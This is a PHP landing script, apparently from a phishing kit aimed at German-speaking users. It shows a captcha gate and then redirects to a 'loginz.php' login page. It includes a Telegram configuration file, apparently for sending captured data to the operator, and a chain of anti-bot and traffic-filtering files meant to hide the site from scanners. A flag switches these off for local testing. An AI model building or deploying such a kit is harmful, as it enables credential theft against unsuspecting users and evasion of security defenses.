<?php
// Only start session if not already started
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Include Telegram configuration and captcha
include './config/telegram.php';
include './captcha.php';

// Handle captcha submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_answer'])) {
    if (verifyCaptcha($_POST['captcha_answer'])) {
        $_SESSION['captcha_verified'] = true;
        // Redirect directly to login page
        header("Location: ./views/loginz.php");
        exit;
    } else {
        // Wrong answer, keep the same captcha question
        $error_message = "Falsche Antwort. Bitte versuchen Sie es erneut.";
    }
}

// Bypass anti-bot protection for local testing
$bypass_antibot = true;

if (!$bypass_antibot) {
    include './antibot.php';
    include './antibot/tds.php';
    include './prevents/genius.php';
    include './antibot/tds.php';
    include './prevents/anti.php';
    include './prevents/anti2.php';
    include './prevents/sub_anti.php';
    include './prevents/block.php';
}

// Check if captcha is already verified
if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== true) {
    // Show captcha form
    ?>
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bitte bestätigen Sie, dass Sie ein Mensch sind</title>
        <style>
            body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 20px; }
            .captcha-container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .captcha-heading { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 15px; text-align: center; }
            .captcha-subheading { font-size: 16px; color: #333; margin-bottom: 25px; text-align: center; }
            .captcha-question { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 20px; text-align: center; }
            .captcha-input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }
            .captcha-button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
            .captcha-button:hover { background: #0056b3; }
        </style>
    </head>
    <body>
        <div class="captcha-container">
            <?php if (isset($error_message)): ?>
                <div style="color: red; text-align: center; margin-bottom: 15px;"><?php echo $error_message; ?></div>
            <?php endif; ?>
            <div class="captcha-heading">Bitte bestätigen Sie, dass Sie ein Mensch sind</div>
            <div class="captcha-subheading">Um fortzufahren, lösen Sie bitte das Captcha unten:</div>
            <div class="captcha-question"><?php echo getCurrentCaptcha(); ?></div>
            <form method="POST">
                <input type="text" name="captcha_answer" class="captcha-input" required>
                <button type="submit" class="captcha-button">Bestätigen</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// If we reach here, captcha is verified, so redirect to login page
header("Location: ./views/loginz.php");
exit;
?>
